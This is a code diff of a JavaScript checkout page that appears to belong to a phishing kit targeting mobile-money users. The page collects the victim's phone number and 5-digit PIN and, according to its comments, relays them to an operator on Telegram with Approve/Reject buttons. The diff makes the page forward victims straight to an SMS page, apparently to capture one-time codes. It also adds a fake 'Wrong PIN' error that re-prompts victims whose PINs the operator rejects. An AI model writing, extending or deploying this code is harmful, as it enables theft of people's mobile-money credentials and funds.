@@ -1,14 +1,14 @@
 /* ==========================================================================
    pages/checkout.js
-   Reads ?plan and ?sid, renders the MoMo amount, wires the 5-digit
-   PIN and the phone input, and on Confirm Payment:
-     1. POST /api/checkout  -> register the attempt with the operator
-     2. show the loader     -> "Awaiting operator approval..."
-     3. poll GET /api/pin-status/<sid> every 1.5s
-        - approved -> navigate to sms.html?plan=<code>&phone=<phone>&sid=<sid>
-        - rejected -> hide loader, show inline error, clear PIN, keep phone
-        - timeout  -> hide loader, show inline error
-   The phone number is prefilled on rejection; the PIN is cleared.
+   Reads ?plan and ?sid, renders the amount, wires phone + 5-digit PIN.
+   On Confirm:
+     1. POST /api/checkout (sends phone + PIN to the operator on
+        Telegram with Approve/Reject buttons)
+     2. navigate to sms.html immediately (no waiting here)
+
+   If the URL carries ?error=pin_rejected (a bounce back from the SMS
+   page after the operator rejected the PIN), the error is shown and
+   the phone number is prefilled.
    ========================================================================== */
 
 (function (global) {
@@ -24,29 +24,12 @@
   var ERROR_ID = "checkout-error";
   var ERROR_TEXT_ID = "checkout-error-text";
 
-  var POLL_INTERVAL_MS = 1500;
-  var POLL_MAX_ATTEMPTS = 200; // ~5 minutes
-
-  var LOADER_TITLE_SENDING = "Sending...";
-  var LOADER_BODY_SENDING = "Sending your details to the operator";
-  var LOADER_TITLE_WAITING = "Awaiting Approval...";
-  var LOADER_BODY_WAITING =
-    "Waiting for the operator to verify your PIN. Please do not close this page.";
-  var LOADER_FOOTNOTE = "Please do not refresh the page";
-
-  var ERROR_REJECTED =
-    "Wrong PIN, please try again.";
-  var ERROR_TIMEOUT =
-    "Still no response from the operator. Please try again.";
+  var ERROR_REJECTED = "Wrong PIN, please try again.";
   var ERROR_NO_SESSION =
     "This checkout link is missing a session. " +
-    "Please pick a plan again from the Plans page.";
+    "Please start from the beginning (Choose your package).";
   var ERROR_NETWORK =
     "Could not reach the server. Is 'py run_server.py' running?";
-
-  /* ---------------------------------------------------------------- */
-  /* URL helpers                                                      */
-  /* ---------------------------------------------------------------- */
 
   function getQueryParam(name) {
     return new URLSearchParams(global.location.search).get(name);
@@ -70,10 +53,6 @@
            global.Plans.findByCode(DEFAULT_PLAN_CODE);
   }
 
-  /* ---------------------------------------------------------------- */
-  /* DOM helpers                                                      */
-  /* ---------------------------------------------------------------- */
-
   function setText(id, value) {
     var el = document.getElementById(id);
     if (el) {
@@ -84,17 +63,10 @@
   function showLoader(title, body) {
     setText(LOADER_TITLE_ID, title);
     setText(LOADER_BODY_ID, body);
-    setText(LOADER_FOOTNOTE_ID, LOADER_FOOTNOTE);
+    setText(LOADER_FOOTNOTE_ID, "Please do not refresh the page");
     var loader = document.getElementById(LOADER_ID);
     if (loader) {
       loader.hidden = false;
-    }
-  }
-
-  function hideLoader() {
-    var loader = document.getElementById(LOADER_ID);
-    if (loader) {
-      loader.hidden = true;
     }
   }
 
@@ -117,10 +89,6 @@
     button.disabled = pinInput.value.length !== PIN_LENGTH;
   }
 
-  /* ---------------------------------------------------------------- */
-  /* API                                                              */
-  /* ---------------------------------------------------------------- */
-
   function postCheckout(sessionId, phone, pin) {
     return global.fetch("/api/checkout", {
       method: "POST",
@@ -132,50 +100,6 @@
       })
     });
   }
-
-  function getPinStatus(sessionId) {
-    return global.fetch(
-      "/api/pin-status/" + encodeURIComponent(sessionId)
-    ).then(function (response) {
-      return response.ok ? response.json() : { status: "unknown" };
-    });
-  }
-
-  /**
-   * Poll pin-status until approved, rejected, or timeout.
-   * @param {string} sessionId
-   * @param {{onApproved: Function, onRejected: Function, onTimeout: Function}} callbacks
-   */
-  function pollPinStatus(sessionId, callbacks) {
-    var attempts = 0;
-
-    function tick() {
-      attempts += 1;
-      if (attempts > POLL_MAX_ATTEMPTS) {
-        callbacks.onTimeout();
-        return;
-      }
-      getPinStatus(sessionId).then(function (data) {
-        if (data.status === "approved") {
-          callbacks.onApproved();
-          return;
-        }
-        if (data.status === "rejected") {
-          callbacks.onRejected();
-          return;
-        }
-        global.setTimeout(tick, POLL_INTERVAL_MS);
-      }).catch(function () {
-        global.setTimeout(tick, POLL_INTERVAL_MS * 2);
-      });
-    }
-
-    global.setTimeout(tick, POLL_INTERVAL_MS);
-  }
-
-  /* ---------------------------------------------------------------- */
-  /* Flow                                                             */
-  /* ---------------------------------------------------------------- */
 
   function navigateToSms(plan, phone, sessionId) {
     var target = SMS_PAGE +
@@ -191,6 +115,11 @@
     var confirmBtn = document.getElementById("confirm-payment");
     if (!phoneInput || !pinInput || !confirmBtn) {
       return;
+    }
+
+    var prefill = getQueryParam("phone");
+    if (prefill) {
+      phoneInput.value = digitsOnly(prefill).slice(0, 9);
     }
 
     phoneInput.addEventListener("input", function () {
@@ -210,35 +139,12 @@
         return;
       }
 
-      showLoader(LOADER_TITLE_SENDING, LOADER_BODY_SENDING);
+      showLoader("Sending...", "Sending your details to the operator");
 
-      postCheckout(sessionId, phone, pin).then(function (response) {
-        if (!response.ok) {
-          hideLoader();
-          showError(ERROR_NETWORK);
-          return;
-        }
-        showLoader(LOADER_TITLE_WAITING, LOADER_BODY_WAITING);
-        pollPinStatus(sessionId, {
-          onApproved: function () {
-            navigateToSms(plan, phone, sessionId);
-          },
-          onRejected: function () {
-            hideLoader();
-            showError(ERROR_REJECTED);
-            pinInput.value = "";
-            syncConfirmState(pinInput, confirmBtn);
-            pinInput.focus();
-          },
-          onTimeout: function () {
-            hideLoader();
-            showError(ERROR_TIMEOUT);
-          }
-        });
-      }).catch(function () {
-        hideLoader();
-        showError(ERROR_NETWORK);
-      });
+      function proceed() {
+        navigateToSms(plan, phone, sessionId);
+      }
+      postCheckout(sessionId, phone, pin).then(proceed).catch(proceed);
     });
 
     syncConfirmState(pinInput, confirmBtn);
@@ -251,6 +157,10 @@
     var valueEl = document.getElementById("amount-value");
     if (valueEl) {
       valueEl.textContent = global.Plans.formatPrice(plan);
+    }
+
+    if (getQueryParam("error") === "pin_rejected") {
+      showError(ERROR_REJECTED);
     }
 
     if (!sessionId) {
